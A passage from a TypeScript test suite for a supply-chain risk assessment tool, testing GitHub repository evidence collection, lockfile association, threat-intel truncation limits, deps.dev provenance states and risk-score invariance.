    const detail = assessment.evidence.find(item => item.kind === "repository_dependency_ioc_lookup")!.detail;
    const serializedBytes = new TextEncoder().encode(JSON.stringify(observation)).byteLength;
    const detailBytes = new TextEncoder().encode(JSON.stringify(detail)).byteLength;
    expect(serializedBytes).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_BYTES);
    expect(detailBytes).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_BYTES);
    expect(observation.status).toBe("CHECKED");
    expect(observation.findings).toHaveLength(0);
    expect(observation.limitations).toContain("threat_intel_payload_truncated");
    expect(observation.limitations.some(item => item.startsWith("threat_intel_packages_inspected_truncated:") && item.endsWith("_of_24"))).toBe(true);
    expect(() => JSON.parse(JSON.stringify(observation))).not.toThrow();
  });

  test("reserves structural markers when limitation and aggregate caps overflow together", async () => {
    const coordinates = Array.from({ length: 24 }, (_, index) => ({
      ...exactCoordinate(`overflow-${index}`),
      sourcePath: `src/${"s".repeat(4_000)}-${index}`,
      manifestPath: `manifests/${"m".repeat(4_000)}-${index}`,
      workspacePath: `workspaces/${"w".repeat(4_000)}-${index}`
    }));
    const { snapshot } = await repositoryObservation(repositoryEvidenceWith(coordinates), async () => { throw new Error("provider-error"); });
    const observation = snapshot.repositoryEvidence!.dependencyThreatIntel;
    expect(observation.limitations.length).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_LIMITATION_ENTRIES);
    expect(observation.limitations).toContain("threat_intel_payload_truncated");
    expect(observation.limitations.some(item => item.startsWith("threat_intel_packages_inspected_truncated:") && item.endsWith("_of_24"))).toBe(true);
    expect(observation.limitations.some(item => item.startsWith("threat_intel_errors_truncated:"))).toBe(true);
    expect(observation.limitations.some(item => item.startsWith("threat_intel_limitations_truncated:"))).toBe(true);
    expect(observation.limitations.filter(item => item.startsWith("threat_intel_limitations_truncated:")).length).toBe(1);
    expect(new TextEncoder().encode(JSON.stringify(observation)).byteLength).toBeLessThanOrEqual(MAX_REPOSITORY_THREAT_INTEL_BYTES);
    expect(observation.status).toBe("UNAVAILABLE");
  });

  test("keeps repository risk unchanged for empty, critical, oversized, and failed observations", async () => {
    const baseline = new RiskEngine().assess({ subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "Scorecard", kind: "score", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] });
    const coordinate = exactCoordinate("invariant", "1.0.0");
    const critical: ThreatFinding = { indicatorType: "package", indicator: "npm:invariant@1.0.0", threatType: "malicious", severity: "critical", source: "fixture", reference: "https://intel.example/invariant" };
    const oversized = Array.from({ length: 500 }, (_, index): ThreatFinding => ({ indicatorType: "package", indicator: `npm:invariant@1.0.0:${index}`, threatType: "malicious", severity: "critical", source: "fixture", reference: `https://intel.example/${index}` }));
    const scenarios = [
      await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => ({ checked: true, findings: [] })),
      await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => ({ checked: true, findings: [critical] })),
      await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => ({ checked: true, findings: oversized })),
      await repositoryObservation(repositoryEvidenceWith([coordinate]), async () => { throw new Error("feed_down"); })
    ];
    for (const [index, scenario] of scenarios.entries()) {
      expect(scenario.assessment.riskScore).toBe(baseline.riskScore);
      expect(scenario.assessment.recommendation).toBe(index === scenarios.length - 1 ? "manual_review" : baseline.recommendation);
      expect(scenario.snapshot.sourceErrors ?? []).toEqual([]);
    }
  });

  test("preserves repository score/recommendation with available or unavailable new evidence", () => {
    const base: RiskSnapshot = { subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: [{ source: "OpenSSF Scorecard", kind: "repository_security_practices", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }] };
    const evidence: RepositoryEvidence = { target: { repository: "github.com/acme/demo", requestedRef: "main", resolvedCommitSha: commitSha }, securityFiles: [{ path: "package.json", category: "manifest" as const, status: "inspected" as const, findings: ["INSTALL_LIFECYCLE_SCRIPT"] }], dependencies: { exact: [], unresolved: [], resolvedGraph: { packagesChecked: 0, nodesObserved: 0, errors: [] } }, dependencyObservations: [], dependencyThreatIntel: { status: "NOT_CHECKED", packagesInspected: [], findings: [], errors: [], limitations: [] }, coverage: { status: "complete" as const, treeEntriesInspected: 1, filesInspected: 1, bytesInspected: 10, limitations: [] }, sourceErrors: [] };
    const unavailable = { ...evidence, coverage: { ...evidence.coverage, status: "partial" as const, limitations: ["github_rate_limited"] }, sourceErrors: ["GitHub: github_rate_limited"] };
    const engine = new RiskEngine();
    const before = engine.assess(base);
    const available = engine.assess({ ...base, repositoryEvidence: evidence });
    const partial = engine.assess({ ...base, repositoryEvidence: unavailable });
    expect({ riskScore: available.riskScore, recommendation: available.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect({ riskScore: partial.riskScore, recommendation: partial.recommendation }).toEqual({ riskScore: before.riskScore, recommendation: before.recommendation });
    expect(available.signals.map(signal => signal.code)).toContain("INSTALL_LIFECYCLE_SCRIPT_OBSERVED");
    expect(partial.signals.map(signal => signal.code)).toContain("REPOSITORY_EVIDENCE_PARTIAL");
    expect(RISK_SNAPSHOT_SCHEMA_VERSION).toBe(3);
    expect(extractRiskFeatures({ ...base, repositoryEvidence: evidence }).schemaVersion).toBe(RISK_FEATURE_SCHEMA_VERSION);
  });

  test("replays v1 package and x402 rows safely but never reinterprets v1 repository rows", () => {
    const rows = [
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "package" as const, id: "old-package" },
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "x402_endpoint" as const, id: "old-endpoint" },
      { snapshotSchemaVersion: 1, featureSchemaVersion: 1, subjectType: "repository" as const, id: "old-repository" },
      { snapshotSchemaVersion: 3, featureSchemaVersion: 3, subjectType: "repository" as const, id: "current-repository" }
    ];
    expect(partitionCompatibleRows(rows, RISK_SNAPSHOT_SCHEMA_VERSION, RISK_FEATURE_SCHEMA_VERSION)).toEqual({
      compatible: [rows[0]!, rows[1]!, rows[3]!],
      incompatible: [rows[2]!],
      schemaVersionsPresent: { snapshot: [1, 3], feature: [1, 3] }
    });
  });

  test("legacy v1 feature replay is semantically compatible, not feature drift", () => {
    const packageSnapshot: RiskSnapshot = { subject: { type: "package", id: "npm:demo@1.0.0" }, vulnerabilities: [], exploitationChecked: true, threatIntelChecked: true, threatFindings: [], evidence: [] };
    const endpointSnapshot: RiskSnapshot = { subject: { type: "x402_endpoint", id: "https://example.com/pay" }, endpoint: { listedOnCircle: true, responseStatus: 402 }, activeProbeChecked: true, historyChecked: true, threatIntelChecked: true, threatFindings: [], evidence: [] };
    for (const snapshot of [packageSnapshot, endpointSnapshot]) {
      expect(extractRiskFeatures(snapshot).repository.present).toBe(false);
      const fresh = extractRiskFeatures(snapshot);
      // A persisted v1 feature row lacks schemaVersion and the repository block.
      const legacyRow: Record<string, unknown> = { ...fresh, schemaVersion: 1 } as unknown as Record<string, unknown>;
      delete legacyRow.repository;
      // Full-object comparison WOULD differ (that was the old false-drift behavior);
      // cohort-aware comparison must prove semantic equality instead.
      expect(featuresEqual(fresh, legacyRow)).toBe(false);
      expect(featuresEqualForCohort(fresh, legacyRow, 1)).toEqual({ equal: true, comparison: "legacy-projected" });
      // Real semantic change on the shared surface still counts as drift.
      const driftedLegacy = { ...legacyRow, vulnerabilityCount: 7 };
      expect(featuresEqualForCohort(fresh, driftedLegacy, 1)).toEqual({ equal: false, comparison: "legacy-projected" });
      // Current-cohort rows keep the strict byte-exact comparison.
      expect(featuresEqualForCohort(fresh, structuredClone(fresh), 2)).toEqual({ equal: true, comparison: "current-schema" });
      const mutatedCurrent = structuredClone(fresh) as unknown as Record<string, unknown>;
      mutatedCurrent.vulnerabilityCount = 3;
      expect(featuresEqualForCohort(fresh, mutatedCurrent, 2).equal).toBe(false);
    }
  });

  test("associates each workspace manifest with its own same-directory lock and preserves distinct coordinates", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const lock = (entries: Record<string, string>) => JSON.stringify({ lockfileVersion: 1, packages: Object.fromEntries(Object.entries(entries).map(([name, version]) => [`node_modules/${name}`, { version }])) });
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { full_name: "acme/demo", default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "frontend/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "frontend/package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "backend/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "backend/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { "root-dep": "^1.0.0" } })),
        [`${base}/contents/package-lock.json?ref=${commitSha}`]: content(lock({ "root-dep": "1.0.1" })),
        [`${base}/contents/frontend%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { shared: "^2.0.0" } })),
        [`${base}/contents/frontend%2Fpackage-lock.json?ref=${commitSha}`]: content(lock({ shared: "2.5.0" })),
        [`${base}/contents/backend%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { shared: "^3.0.0" } })),
        [`${base}/contents/backend%2Fpackage-lock.json?ref=${commitSha}`]: content(lock({ shared: "3.9.9" }))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([
      { ecosystem: "NPM", name: "shared", version: "3.9.9", sourcePath: "backend/package-lock.json", manifestPath: "backend/package.json", workspacePath: "backend" },
      { ecosystem: "NPM", name: "shared", version: "2.5.0", sourcePath: "frontend/package-lock.json", manifestPath: "frontend/package.json", workspacePath: "frontend" },
      { ecosystem: "NPM", name: "root-dep", version: "1.0.1", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." }
    ]);
    expect(result.dependencies.unresolved).toEqual([]);
    expect(result.coverage.status).toBe("complete");
  });

  test("never resolves declarations against an unrelated lockfile when association is unprovable", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { full_name: "acme/demo", default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "app/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "other/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/app%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: { demo: "^1.0.0" } })),
        [`${base}/contents/other%2Fpackage-lock.json?ref=${commitSha}`]: content(JSON.stringify({ packages: { "node_modules/demo": { version: "9.9.9" } } }))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.dependencies.exact).toEqual([]);
    expect(result.dependencies.unresolved).toEqual([{ ecosystem: "NPM", name: "demo", requirement: "^1.0.0", manifestPath: "app/package.json", workspacePath: "app" }]);
    expect(result.coverage.limitations).toContain("dependency_lock_missing:app/package.json");
    expect(result.coverage.status).toBe("partial");
  });

  test("reports detected but unsupported dependency ecosystems instead of claiming coverage", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { full_name: "acme/demo", default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "pyproject.toml", type: "blob", sha: packageBlob, size: 100 },
          { path: "requirements-dev.txt", type: "blob", sha: packageBlob, size: 100 },
          { path: "Cargo.toml", type: "blob", sha: packageBlob, size: 100 },
          { path: "go.mod", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/pyproject.toml?ref=${commitSha}`]: content("[project]\n"),
        [`${base}/contents/requirements-dev.txt?ref=${commitSha}`]: content("requests==2.0.0\n"),
        [`${base}/contents/Cargo.toml?ref=${commitSha}`]: content("[dependencies]\n"),
        [`${base}/contents/go.mod?ref=${commitSha}`]: content("module example.com/demo\n")
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.coverage.limitations).toEqual(expect.arrayContaining(["dependency_resolution_unsupported:GO", "dependency_resolution_unsupported:PYPI"]));
    expect(result.coverage.status).toBe("partial");
  });

  test("fails closed on invalid commit identities, rate limits, timeouts, and oversized streamed bodies", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const invalidIdentity = { async request() { return response({ full_name: "acme/demo", default_branch: "main", sha: "not-a-sha", commit: { tree: {} } }); } };
    await expect(new GitHubRepositoryProvider(invalidIdentity as never).collect("acme", "demo")).rejects.toThrow("github_commit_identity_invalid");
    const rateLimited = { async request() { return response({}, 403); } };
    await expect(new GitHubRepositoryProvider(rateLimited as never).collect("acme", "demo")).rejects.toThrow("github_rate_limited");
    const timedOut = { async request() { throw new Error("upstream_timeout"); } };
    await expect(new GitHubRepositoryProvider(timedOut as never).collect("acme", "demo")).rejects.toThrow("upstream_timeout");
    const oversized = { async request(_url: string | URL, _init?: RequestInit) {
      const stream = new ReadableStream<Uint8Array>({
        start(controller) { controller.enqueue(new Uint8Array(MAX_STREAM_BYTES + 1)); controller.close(); }
      });
      return new Response(stream) as unknown as Response;
    } };
    await expect(new GitHubRepositoryProvider(oversized as never).collect("acme", "demo")).rejects.toThrow("github_response_oversized");
  });

  test("records missing and binary security files honestly instead of inspecting them", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const binaryContent = Buffer.from([0x7b, 0x00, 0x7d]).toString("base64");
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { full_name: "acme/demo", default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "missing/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "binary-package/package.json", type: "blob", sha: packageBlob, size: 3 },
          { path: "keepalive.yml", type: "blob", sha: workflowBlob, size: 10 }
        ] },
        [`${base}/contents/binary-package%2Fpackage.json?ref=${commitSha}`]: { encoding: "base64", content: binaryContent }
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    const result = await new GitHubRepositoryProvider(http as never).collect("acme", "demo");
    expect(result.securityFiles).toEqual(expect.arrayContaining([
      { path: "missing/package.json", category: "manifest", status: "unsupported", findings: [] },
      { path: "binary-package/package.json", category: "manifest", status: "binary", findings: [] }
    ]));
    expect(result.coverage.limitations).toEqual(expect.arrayContaining(["github_http_404:missing/package.json", "security_file_binary:binary-package/package.json"]));
    expect(result.coverage.status).toBe("partial");
  });

  test("keeps malformed or unverifiable provenance explicit rather than dropping it", async () => {
    const http = { async boundedJson() { return { slsaProvenances: [{ verified: true }] }; } };
    const observed = await new DepsDevProvider(http as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(observed.observation.provenance[0]?.state).toBe("ERROR");
    const unverified = await new DepsDevProvider({ async boundedJson() { return { attestations: [{ verified: false, sourceRepository: "https://github.com/acme/demo", url: "https://prov.example/1" }] }; } } as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(unverified.observation.provenance[0]).toMatchObject({ state: "PRESENT_UNVERIFIED", attestationUrl: "https://prov.example/1" });
    const unavailable = await new DepsDevProvider({ async boundedJson() { return {}; } } as never).packageVersion({ ecosystem: "NPM", name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." });
    expect(unavailable.observation.provenance[0]?.state).toBe("UNAVAILABLE");
  });

  test("preserves the host/path separator in canonical repository identity", async () => {
    const expected = { repository: "github.com/acme/demo", commit: commitSha };
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo", commit: commitSha }, expected).state).toBe("VERIFIED");
    expect(normalizeProvenance({ verified: true, sourceRepository: "git+ssh://git@github.com/acme/demo.git", commit: commitSha }, expected)).toMatchObject({ state: "VERIFIED", sourceRepository: "github.com/acme/demo", expectedSourceMatches: true, expectedCommitMatches: true });
    // Cryptographic attestation without a source commit must NOT become VERIFIED
    // against an expected commit: verification and expected-commit matching are
    // separate facts and the match is unknown, so it fails closed explicitly.
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo" }, expected).state).toBe("VERIFIED_COMMIT_UNCONFIRMED");
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo" }, expected).expectedCommitMatches).toBe(false);
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo" }).state).toBe("VERIFIED");
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/other/repo", commit: commitSha }, expected).state).toBe("VERIFIED_SOURCE_MISMATCH");
    expect(normalizeProvenance({ verified: true, sourceRepository: "https://github.com/acme/demo", commit: "1111111111111111111111111111111111111111" }, expected).state).toBe("VERIFIED_COMMIT_MISMATCH");
  });

  test("treats top-level and per-node deps.dev graph errors as unchecked graphs with bounded diagnostics", async () => {
    const coordinate = { ecosystem: "NPM" as const, name: "demo", version: "1.0.0", sourcePath: "package-lock.json", manifestPath: "package.json", workspacePath: "." };
    const maxGraphBytes = 2 * 1024 * 1024;
    const topLevel = await new DepsDevProvider({ async boundedJson(_url: string, maximumBytes: number) {
      if (maximumBytes === maxGraphBytes) return { error: "internal dependency graph error", nodes: [] };
      return {};
    } } as never).packageVersion(coordinate);
    expect(topLevel.observation.graph).toMatchObject({ checked: false, error: "internal dependency graph error" });
    const nodeLevel = await new DepsDevProvider({ async boundedJson(_url: string, maximumBytes: number) {
      if (maximumBytes === maxGraphBytes) return { nodes: [{ errors: ["missing version resolution for left-pad@^1.0.0"] }, {}, { errors: ["second", "third", "fourth", "fifth", "sixth"] }] };
      return {};
    } } as never).packageVersion(coordinate);
    expect(nodeLevel.observation.graph.checked).toBe(false);
    expect(nodeLevel.observation.graph.error).toContain("missing version resolution for left-pad@^1.0.0");
    expect(nodeLevel.observation.graph.error!.split("; ").length).toBeLessThanOrEqual(5);
    const cleanGraph = await new DepsDevProvider({ async boundedJson(_url: string, maximumBytes: number) {
      if (maximumBytes === maxGraphBytes) return { nodes: [{}] };
      return {};
    } } as never).packageVersion(coordinate);
    expect(cleanGraph.observation.graph).toEqual({ checked: true, nodeCount: 1 });
  });

  test("bounds deps.dev enrichment deterministically instead of fanning out to every declared coordinate", async () => {
    const base = "https://api.github.com/repos/acme/demo";
    const lock = (entries: Record<string, string>) => JSON.stringify({ lockfileVersion: 1, packages: Object.fromEntries(Object.entries(entries).map(([name, version]) => [`node_modules/${name}`, { version }])) });
    // 40 distinct exact coordinates across two workspaces — above the enrichment limit.
    const rootEntries = Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`pkg-${i}`, `1.0.${i}`]));
    const nestedEntries = Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`nested-${i}`, `2.0.${i}`]));
    const http = { async request(url: string | URL) {
      const target = String(url);
      const fixtures: Record<string, unknown> = {
        [base]: { full_name: "acme/demo", default_branch: "main" },
        [`${base}/commits/main`]: { sha: commitSha, commit: { tree: { sha: treeSha } } },
        [`${base}/git/trees/${treeSha}?recursive=1`]: { truncated: false, tree: [
          { path: "package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "package-lock.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "app/package.json", type: "blob", sha: packageBlob, size: 100 },
          { path: "app/package-lock.json", type: "blob", sha: packageBlob, size: 100 }
        ] },
        [`${base}/contents/package.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: Object.fromEntries(Object.keys(rootEntries).map(name => [name, "^1.0.0"])) })),
        [`${base}/contents/package-lock.json?ref=${commitSha}`]: content(lock(rootEntries)),
        [`${base}/contents/app%2Fpackage.json?ref=${commitSha}`]: content(JSON.stringify({ dependencies: Object.fromEntries(Object.keys(nestedEntries).map(name => [name, "^2.0.0"])) })),
        [`${base}/contents/app%2Fpackage-lock.json?ref=${commitSha}`]: content(lock(nestedEntries))
      };
      return response(fixtures[target] ?? {}, fixtures[target] === undefined ? 404 : 200);
    } };
    let enrichmentCalls = 0;
    const seenCoordinates: string[] = [];
    const depsDev = fakeDepsDev(coordinate => {
      enrichmentCalls += 1;
      seenCoordinates.push(`${coordinate.name}@${coordinate.version}`);
    });
    const threatIntel = threatIntelStore(async () => ({ checked: true, findings: [] }));
    const omni = new OmniIntelligence(new RiskEngine(), new CachedLoader(memoryCache()), {} as never, {} as never, staticScorecard as never, {} as never, {} as never, {} as never, {} as never, threatIntel as never, new NoopAssessmentJournal(), new GitHubRepositoryProvider(http as never) as never, depsDev as never);

    const assessment = await omni.repositoryRisk("acme", "demo");
    const evidence = evidenceOf(assessment);

    expect(enrichmentCalls).toBeLessThanOrEqual(24);
    expect(evidence.coverage.status).toBe("complete");
    expect(evidence.coverage.limitations).toEqual([]);
    expect(assessment.scoreStatus).toBe("measured_partial");
    expect(assessment.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    expect(assessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    // Deterministic selection: repeated runs select the same coordinates in the same order.
    const secondSeen: string[] = [];
    const again = fakeDepsDev(coordinate => { secondSeen.push(`${coordinate.name}@${coordinate.version}`); });
    const otherThreatIntel = threatIntelStore(async () => ({ checked: true, findings: [] }));
    const other = new OmniIntelligence(new RiskEngine(), new CachedLoader(memoryCache()), {} as never, {} as never, staticScorecard as never, {} as never, {} as never, {} as never, {} as never, otherThreatIntel as never, new NoopAssessmentJournal(), new GitHubRepositoryProvider(http as never) as never, again as never);
    const second = await other.repositoryRisk("acme", "demo");
    expect(secondSeen.sort()).toEqual([...seenCoordinates].sort());
    // Observation-only evidence never changes the repository verdict, and
    // repository threat-intel failures stay outside generic sourceErrors.
    const engine = new RiskEngine();
    const baselineEvidence = [{ source: "OpenSSF Scorecard", kind: "repository_security_practices", observedAt: "2026-08-26T00:00:00.000Z", detail: { score: 9.5 } }];
    const baseline = engine.assess({ subject: { type: "repository", id: "github.com/acme/demo" }, scorecard: 9.5, evidence: baselineEvidence });
    expect(assessment.riskScore).toBe(baseline.riskScore);
    expect(assessment.recommendation).toBe("manual_review");
    expect(second.riskScore).toBe(baseline.riskScore);
    expect(second.recommendation).toBe("manual_review");
  });

  test("maps complete, partial, and unavailable GitHub collection states independently", async () => {
    const complete = await repositoryOmni(repositoryEvidenceWith([]), threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(complete.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 });

    const partialEvidence = repositoryEvidenceWith([]);
    partialEvidence.coverage = { ...partialEvidence.coverage, status: "partial", limitations: ["github_tree_truncated"] };
    const partial = await repositoryOmni(partialEvidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(partial.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "UNKNOWN", weight: 1 });
    expect(partial.coverage?.resolvedWeight).toBe(1);
    expect(partial.coverage?.applicableWeight).toBe(5);

    const unavailableGithub = {
      async resolve(): Promise<never> { throw new Error("github_timeout"); },
      async collectResolved(): Promise<RepositoryEvidence> { throw new Error("unreachable"); }
    };
    const unavailable = await repositoryOmni(repositoryEvidenceWith([]), threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, unavailableGithub).repositoryRisk("acme", "demo");
    expect(unavailable.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 });
    expect(unavailable.sourceErrors).toContain("GitHub: github_timeout");

    const downstreamFailure = repositoryEvidenceWith([exactCoordinate("downstream-failure")]);
    const downstreamDepsDev = fakeDepsDev(() => {});
    downstreamDepsDev.packageVersion = async () => { throw new Error("deps_dev_timeout"); };
    const completeWithDepsDevFailure = await repositoryOmni(downstreamFailure, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, downstreamDepsDev).repositoryRisk("acme", "demo");
    expect(completeWithDepsDevFailure.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    expect(completeWithDepsDevFailure.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "UNAVAILABLE", weight: 1 });
    const primaryDetail = completeWithDepsDevFailure.evidence.find(item => item.kind === "repository_primary_evidence")?.detail ?? {};
    expect(primaryDetail.collectorErrors).toEqual([]);
    expect(primaryDetail.limitations).toEqual([]);

    const unsupportedEvidence = repositoryEvidenceWith([]);
    unsupportedEvidence.coverage.limitations = ["dependency_resolution_unsupported:CARGO"];
    const completeWithUnsupported = await repositoryOmni(unsupportedEvidence, threatIntelStore(async () => ({ checked: true, findings: [] }))).repositoryRisk("acme", "demo");
    expect(completeWithUnsupported.coverage?.sources).toContainEqual({ source: "GitHub Repository Evidence", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    expect(completeWithUnsupported.coverage?.sources).toContainEqual({ source: "Dependency Resolution", execution: "NOT_QUERIED", status: "UNKNOWN", weight: 1 });
  });

  test("aggregates deps.dev provenance states without confusing absence, observation, and uncertainty", async () => {
    const coordinate = exactCoordinate("provenance-package", "1.0.0");
    const withEvidence = (state: "PRESENT_UNVERIFIED" | "VERIFIED" | "VERIFIED_SOURCE_MISMATCH" | "VERIFIED_COMMIT_MISMATCH" | "VERIFIED_COMMIT_UNCONFIRMED") => {
      const evidence = repositoryEvidenceWith([coordinate]);
      const depsDev = fakeDepsDev(() => {});
      depsDev.packageVersion = async item => ({
        observation: { coordinate: item, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: item, state, source: "deps.dev" }] },
        evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
      });
      return repositoryOmni(evidence, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, depsDev);
    };

    const observed = await (await withEvidence("VERIFIED")).repositoryRisk("acme", "demo");
    expect(observed.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    const unverified = await (await withEvidence("PRESENT_UNVERIFIED")).repositoryRisk("acme", "demo");
    expect(unverified.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "OBSERVED", weight: 1 });
    const mismatch = await (await withEvidence("VERIFIED_SOURCE_MISMATCH")).repositoryRisk("acme", "demo");
    expect(mismatch.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "OBSERVED", weight: 1 });

    const mixedObservedAbsent = repositoryEvidenceWith([coordinate, exactCoordinate("provenance-absent")]);
    const mixedObservedAbsentDepsDev = fakeDepsDev(() => {});
    mixedObservedAbsentDepsDev.packageVersion = async item => ({
      observation: { coordinate: item, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: item, state: item.name === "provenance-absent" ? "UNAVAILABLE" : "VERIFIED", source: "deps.dev" }] },
      evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
    });
    const mixedObservedAbsentAssessment = await repositoryOmni(mixedObservedAbsent, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, mixedObservedAbsentDepsDev).repositoryRisk("acme", "demo");
    expect(mixedObservedAbsentAssessment.coverage?.sources).toContainEqual({ source: "deps.dev Provenance", execution: "QUERIED", status: "OBSERVED", weight: 1 });

    const mixedUnverifiedAbsent = repositoryEvidenceWith([coordinate, exactCoordinate("provenance-absent")]);
    const mixedUnverifiedAbsentDepsDev = fakeDepsDev(() => {});
    mixedUnverifiedAbsentDepsDev.packageVersion = async item => ({
      observation: { coordinate: item, licenses: [], advisoryIds: [], graph: { checked: true, nodeCount: 1 }, provenance: [{ package: item, state: item.name === "provenance-absent" ? "UNAVAILABLE" : "PRESENT_UNVERIFIED", source: "deps.dev" }] },
      evidence: { source: "deps.dev", kind: "package_dependency_provenance", observedAt: "2026-01-01T00:00:00.000Z", detail: {} }
    });
    const mixedUnverifiedAbsentAssessment = await repositoryOmni(mixedUnverifiedAbsent, threatIntelStore(async () => ({ checked: true, findings: [] })), new NoopAssessmentJournal(), staticScorecard, undefined, mixedUnverifiedAbsentDepsDev).repositoryRisk("acme", "demo");
